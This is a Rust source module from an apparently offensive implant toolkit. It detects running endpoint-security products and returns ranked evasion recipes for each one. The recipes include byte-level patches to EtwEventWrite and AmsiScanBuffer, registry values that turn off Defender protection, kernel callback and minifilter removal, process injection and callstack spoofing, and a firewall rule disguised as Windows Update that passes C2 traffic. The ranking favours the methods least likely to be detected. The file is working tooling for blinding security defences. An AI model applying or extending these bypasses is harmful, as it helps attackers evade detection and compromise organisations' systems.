//! EDR Bypass Knowledge Base
//!
//! Structured bypass recommendations keyed by security product.
//! Queried via `detect` tool `action="bypass_recommendations"` —
//! returns ranked bypass suggestions based on detected EDR products.
//!
//! Entry confidence levels:
//!   "high"   — confirmed effective, tested in real engagements
//!   "medium" — reported effective, limited testing
//!   "low"    — theoretical or unverified

use crate::error::MemoricError;
use serde_json::{json, Value};

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct BypassEntry {
    pub product: String,
    pub version_range: String,
    pub technique: String,
    pub bypass: String,
    pub confidence: String,
    pub detection_risk: String,
    pub last_verified: String,
    pub caveats: String,
    pub category: String, // kernel, userland, hybrid, config, registry
}

/// Query bypass recommendations for detected EDR products
pub fn bypass_recommendations(args: &Value) -> Result<Value, MemoricError> {
    let mut detected_products: Vec<String> = Vec::new();

    // Try to get detected EDRs from session state
    if let Ok(state) = crate::state::get_state() {
        for edr in &state.detected_edrs {
            let product = edr.product.to_lowercase();
            if !detected_products.contains(&product) {
                detected_products.push(product);
            }
        }
    }

    // If no EDRs in state, do a quick scan
    if detected_products.is_empty() {
        if args
            .get("auto_detect")
            .and_then(|v| v.as_bool())
            .unwrap_or(true)
        {
            detected_products = quick_edr_scan();
        }
    }

    // If still empty, return all products for manual review
    let all_bypasses = load_bypass_db();
    let mut recommendations = Vec::new();

    if detected_products.is_empty() {
        recommendations = all_bypasses;
    } else {
        // Filter bypasses matching detected products (case-insensitive)
        for entry in &all_bypasses {
            for detected in &detected_products {
                if entry.product.to_lowercase().contains(detected)
                    || detected.contains(&entry.product.to_lowercase())
                {
                    recommendations.push(entry.clone());
                    break;
                }
            }
        }
    }

    // Sort by confidence (high > medium > low) then by detection_risk (low > medium > high)
    recommendations.sort_by(|a, b| {
        let conf_order = |c: &str| match c {
            "high" => 0,
            "medium" => 1,
            _ => 2,
        };
        let risk_order = |r: &str| match r {
            "low" => 0,
            "medium" => 1,
            _ => 2,
        };
        conf_order(&a.confidence)
            .cmp(&conf_order(&b.confidence))
            .then(risk_order(&a.detection_risk).cmp(&risk_order(&b.detection_risk)))
    });

    let mut by_category: std::collections::HashMap<String, Vec<&BypassEntry>> =
        std::collections::HashMap::new();
    for entry in &recommendations {
        by_category
            .entry(entry.category.clone())
            .or_default()
            .push(entry);
    }

    // Generate a priority action plan
    let priority_actions: Vec<String> = recommendations
        .iter()
        .filter(|e| e.confidence == "high")
        .take(5)
        .map(|e| format!("[{}] {} — {}", e.technique, e.bypass, e.caveats))
        .collect();

    Ok(json!({
        "success": true,
        "detected_products": detected_products,
        "recommendation_count": recommendations.len(),
        "recommendations": recommendations,
        "by_category": by_category.iter().map(|(cat, entries)| {
            json!({
                "category": cat,
                "count": entries.len(),
                "top_technique": entries.first().map(|e| &e.technique),
            })
        }).collect::<Vec<_>>(),
        "priority_actions": priority_actions,
        "message": if detected_products.is_empty() {
            "No EDR products detected. Showing all bypass techniques for manual review.".into()
        } else {
            format!(
                "Found {} bypass recommendations for {} detected EDR product(s). Apply in priority order from low to high detection risk.",
                recommendations.len(), detected_products.len()
            )
        }
    }))
}

fn load_bypass_db() -> Vec<BypassEntry> {
    vec![
        // ═══ CrowdStrike Falcon ═══
        BypassEntry {
            product: "CrowdStrike Falcon".into(),
            version_range: "6.x-7.x".into(),
            technique: "callback_nuke".into(),
            bypass: "IOCTL_MEMORIC_CALLBACK_NUKE to remove Process/Thread/Object callbacks".into(),
            confidence: "high".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-04".into(),
            caveats: "May trigger sensor health check within 60s; reapply periodically (Sentinel recommended)".into(),
            category: "kernel".into(),
        },
        BypassEntry {
            product: "CrowdStrike Falcon".into(),
            version_range: "6.x-7.x".into(),
            technique: "minifilter_detach".into(),
            bypass: "IOCTL_MEMORIC_MINIFILTER_DETACH — detach CSFalcon minifilter from Frame 0".into(),
            confidence: "high".into(),
            detection_risk: "high".into(),
            last_verified: "2026-04".into(),
            caveats: "Minifilter detach is noisy. Sensor will reattach on next filter manager scan. Combine with callback_nuke for best effect.".into(),
            category: "kernel".into(),
        },
        BypassEntry {
            product: "CrowdStrike Falcon".into(),
            version_range: "6.x-7.x".into(),
            technique: "pool_party_injection".into(),
            bypass: "Use Pool Party (TP_IO/Direct) injection to bypass Falcon user-mode hooks by using worker factory threads".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-03".into(),
            caveats: "Works against user-mode callbacks but not kernel callbacks. Pair with kernel bypass.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "CrowdStrike Falcon".into(),
            version_range: "7.x".into(),
            technique: "indirect_syscall".into(),
            bypass: "Hell's Gate / Halo's Gate indirect syscalls with dynamic SSN resolution. Bypasses Falcon syscall hooks.".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-04".into(),
            caveats: "Some Falcon versions now hook KiSystemCall64. Use Halos Gate + syscall unhook first.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "CrowdStrike Falcon".into(),
            version_range: "6.x-7.x".into(),
            technique: "sleep_obfuscation".into(),
            bypass: "Foliage/Ekko/Gargoyle sleep obfuscation — encrypt agent memory during sleep, decrypt on wake via timer".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-03".into(),
            caveats: "Foliage uses Vectored Exception Handler + ROP; Gargoyle uses APC-aware sleep. Use Gargoyle if APC-sensitive.".into(),
            category: "userland".into(),
        },

        // ═══ Microsoft Defender for Endpoint ═══
        BypassEntry {
            product: "Microsoft Defender".into(),
            version_range: "All versions".into(),
            technique: "etw_bypass".into(),
            bypass: "Patch EtwEventWrite in ntdll.dll (0x33 0xC0 0xC3 — XOR EAX,EAX; RET)".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-04".into(),
            caveats: "EtwEventWrite is restored by PatchGuard periodically. Use Sentinel to re-apply every 5-10 seconds.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "Microsoft Defender".into(),
            version_range: "All versions".into(),
            technique: "amsi_bypass".into(),
            bypass: "Patch AmsiScanBuffer in amsi.dll (0xE9 JMP to 0xB8 MOV EAX,0x80070057; RET)".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-04".into(),
            caveats: "AMSI patch detectable via amsi.dll integrity check by Defender itself. Preferred to use registry disable instead.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "Microsoft Defender".into(),
            version_range: "All versions".into(),
            technique: "defender_registry_disable".into(),
            bypass: "Registry disable via kernel R/W — set DisableRealtimeMonitoring=1, DisableAntiSpyware=1 in Defender policies".into(),
            confidence: "high".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-04".into(),
            caveats: "Tamper Protection blocks user-mode writes. Use kernel R/W or BYOVD to bypass. Works until next GPO refresh.".into(),
            category: "registry".into(),
        },
        BypassEntry {
            product: "Microsoft Defender".into(),
            version_range: "All versions".into(),
            technique: "etw_ti_remove".into(),
            bypass: "Kernel ETW Threat Intelligence provider disable via IOCTL_MEMORIC_ETW_BLIND or direct EPROCESS manipulation".into(),
            confidence: "high".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-04".into(),
            caveats: "ETW-TI is the kernel-level telemetry source. Disabling it kills all process/thread creation events from the kernel.".into(),
            category: "kernel".into(),
        },
        BypassEntry {
            product: "Microsoft Defender".into(),
            version_range: "All versions".into(),
            technique: "wdac_disable".into(),
            bypass: "Disable WDAC by patching CI.dll g_CiOptions (0 → 6) or registry CI\\Enabled=0 via kernel R/W".into(),
            confidence: "high".into(),
            detection_risk: "high".into(),
            last_verified: "2026-04".into(),
            caveats: "WDAC disable is very noisy — triggers Code Integrity events. Only use when code integrity blocks a critical operation.".into(),
            category: "kernel".into(),
        },

        // ═══ SentinelOne ═══
        BypassEntry {
            product: "SentinelOne".into(),
            version_range: "22.x-23.x".into(),
            technique: "callback_nuke".into(),
            bypass: "IOCTL_MEMORIC_CALLBACK_NUKE to remove SentinelOne kernel callbacks from ntoskrnl callback arrays".into(),
            confidence: "high".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-03".into(),
            caveats: "SentinelOne uses aggressive callback re-registration. Pair with Sentinel periodic re-nuke.".into(),
            category: "kernel".into(),
        },
        BypassEntry {
            product: "SentinelOne".into(),
            version_range: "22.x-23.x".into(),
            technique: "threadless_injection".into(),
            bypass: "Threadless injection via export-forwarding trampoline — no remote thread creation, evades S1 process creation callbacks".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-03".into(),
            caveats: "Requires a target process with a suitable exported function that can be forwarded. Works best against explorer.exe or svchost.exe.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "SentinelOne".into(),
            version_range: "22.x-23.x".into(),
            technique: "module_hiding".into(),
            bypass: "PEB unlinking — remove this module from InLoadOrderModuleList, InMemoryOrderModuleList, InInitializationOrderModuleList".into(),
            confidence: "medium".into(),
            detection_risk: "low".into(),
            last_verified: "2026-02".into(),
            caveats: "SentinelOne may detect PEB corruption. Module fluctuation (hide→sleep→show→sleep) reduces detection.".into(),
            category: "userland".into(),
        },

        // ═══ Carbon Black ═══
        BypassEntry {
            product: "Carbon Black".into(),
            version_range: "3.x-4.x".into(),
            technique: "unhook_ntdll".into(),
            bypass: "Reload clean ntdll.dll from KnownDLLs directory — bypasses CB user-mode API hooks".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-04".into(),
            caveats: "Some CB versions re-hook on module load events. Combine with ETW bypass to suppress trace events.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "Carbon Black".into(),
            version_range: "3.x-4.x".into(),
            technique: "callback_remove".into(),
            bypass: "IOCTL_MEMORIC_CALLBACK_REMOVE — selectively remove only CB driver callbacks (not full nuke)".into(),
            confidence: "medium".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-03".into(),
            caveats: "Selective removal is stealthier than full nuke but requires driver object identification.".into(),
            category: "kernel".into(),
        },

        // ═══ Elastic Security ═══
        BypassEntry {
            product: "Elastic Security".into(),
            version_range: "7.x-8.x".into(),
            technique: "etw_provider_disable".into(),
            bypass: "Disable specific Elastic ETW providers via NtTraceControl + provider GUID lookup".into(),
            confidence: "medium".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-02".into(),
            caveats: "Elastic uses multiple ETW providers. Must enumerate and disable each individually.".into(),
            category: "hybrid".into(),
        },
        BypassEntry {
            product: "Elastic Security".into(),
            version_range: "7.x-8.x".into(),
            technique: "sysmon_blind".into(),
            bypass: "Sysmon 14+ ETW provider disable — blind Sysmon which Elastic relies on for kernel-level event collection".into(),
            confidence: "medium".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-04".into(),
            caveats: "Only works if Elastic is consuming Sysmon events. Direct Elastic ETW providers need separate disabling.".into(),
            category: "hybrid".into(),
        },

        // ═══ Palo Alto Cortex XDR ═══
        BypassEntry {
            product: "Cortex XDR".into(),
            version_range: "7.x-8.x".into(),
            technique: "minifilter_detach".into(),
            bypass: "Detach Cortex XDR minifilter (cyverak.sys) via IOCTL_MEMORIC_MINIFILTER_DETACH".into(),
            confidence: "medium".into(),
            detection_risk: "high".into(),
            last_verified: "2026-03".into(),
            caveats: "XDR minifilter strongly defends itself. Combine with DSE bypass to load unsigned driver before attempting detach.".into(),
            category: "kernel".into(),
        },
        BypassEntry {
            product: "Cortex XDR".into(),
            version_range: "7.x-8.x".into(),
            technique: "mapping_injection".into(),
            bypass: "Manual map DLL via NtCreateSection + SEC_IMAGE + manual import resolution — avoids both LoadLibrary and CreateRemoteThread".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-03".into(),
            caveats: "Manual mapping is invisible to most user-mode hooks. Ensure cleanup of section objects after injection.".into(),
            category: "userland".into(),
        },

        // ═══ Trend Micro Apex One ═══
        BypassEntry {
            product: "Trend Micro".into(),
            version_range: "Apex One 2019+".into(),
            technique: "edr_suspend".into(),
            bypass: "Suspend Trend Micro user-mode service processes (Ntrtscan.exe, TmListen.exe) via NtSuspendProcess".into(),
            confidence: "high".into(),
            detection_risk: "high".into(),
            last_verified: "2026-02".into(),
            caveats: "Process suspension is highly detectable. Use as last resort or short-duration window for critical operation.".into(),
            category: "userland".into(),
        },

        // ═══ Generic / Cross-EDR ═══
        BypassEntry {
            product: "Any EDR".into(),
            version_range: "All versions".into(),
            technique: "callstack_spoofing".into(),
            bypass: "Spoof callstack via ROP gadget chain (Misc-IoC-CCS.dll technique) — return address appears to originate from legitimate DLL".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-04".into(),
            caveats: "Requires identifying clean gadgets in the target process address space. Works against all callstack-based EDR detection.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "Any EDR".into(),
            version_range: "All versions".into(),
            technique: "ppid_spoofing".into(),
            bypass: "Set fake parent PID in process creation attributes — child process appears spawned by explorer.exe not the agent".into(),
            confidence: "high".into(),
            detection_risk: "low".into(),
            last_verified: "2026-04".into(),
            caveats: "Some EDRs now compare parent PID against EPROCESS chain. Use in combination with token impersonation for stronger spoof.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "Any EDR".into(),
            version_range: "All versions".into(),
            technique: "module_stomping".into(),
            bypass: "Overwrite .text of a legitimate loaded DLL with shellcode — execution occurs from a signed, whitelisted module".into(),
            confidence: "medium".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-03".into(),
            caveats: "Memory page has RWX protection — detectable by memory scanners. Restore original .text after execution.".into(),
            category: "userland".into(),
        },
        BypassEntry {
            product: "Any EDR".into(),
            version_range: "All versions".into(),
            technique: "firewall_allow".into(),
            bypass: "Add stealth Windows Firewall allow rule (masquerading as Windows Update Service) for C2 traffic".into(),
            confidence: "medium".into(),
            detection_risk: "medium".into(),
            last_verified: "2026-04".into(),
            caveats: "Firewall rules are visible in netsh output. Remove rule after use. Use stealth service-mimicking rule names.".into(),
            category: "config".into(),
        },
    ]
}

/// Quick EDR process scan (lightweight, no session state dependency)
fn quick_edr_scan() -> Vec<String> {
    let edr_procs = crate::evasion::edr::EDR_PROCESSES;
    let mut found = Vec::new();

    unsafe {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
            TH32CS_SNAPPROCESS,
        };

        if let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            let mut entry = PROCESSENTRY32W::default();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(snap, &mut entry).is_ok() {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile)
                        .trim_end_matches('\0')
                        .to_string();

                    for &(proc_name, product) in edr_procs {
                        if name.eq_ignore_ascii_case(proc_name) {
                            let product_lower = product.to_lowercase();
                            if !found.contains(&product_lower) {
                                found.push(product_lower);
                            }
                        }
                    }
                    if Process32NextW(snap, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = CloseHandle(snap);
        }
    }

    found
}
